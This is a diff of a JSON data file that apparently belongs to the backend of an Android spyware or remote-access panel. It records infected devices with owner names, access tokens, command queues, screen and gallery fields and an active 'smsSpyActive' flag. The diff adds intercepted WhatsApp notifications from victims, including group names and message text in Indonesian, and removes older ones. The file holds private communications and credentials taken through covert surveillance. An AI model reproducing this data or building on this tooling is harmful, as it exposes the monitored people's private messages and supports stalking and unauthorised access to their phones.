@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776781120544,
+    "lastSeen": 1776781126670,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎2905 pesan dari 17 chat",
+        "time": "21/04 21:18",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781129159
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎GB ZUNZ PEKALONGAN (1007 pesan): ~ SAKHA #1",
+        "content": "sini gw lampung",
+        "time": "21/04 21:18",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781129076
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -10312,22 +10328,6 @@
         "time": "21/04 20:48",
         "pkg": "com.whatsapp",
         "receivedAt": 1776779315992
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎3577 pesan dari 21 chat",
-        "time": "21/04 20:48",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776779315874
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎3576 pesan dari 21 chat",
-        "time": "21/04 20:47",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776779246182
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776781122273,
+    "lastSeen": 1776781125255,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776781120915,
+    "lastSeen": 1776781126868,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
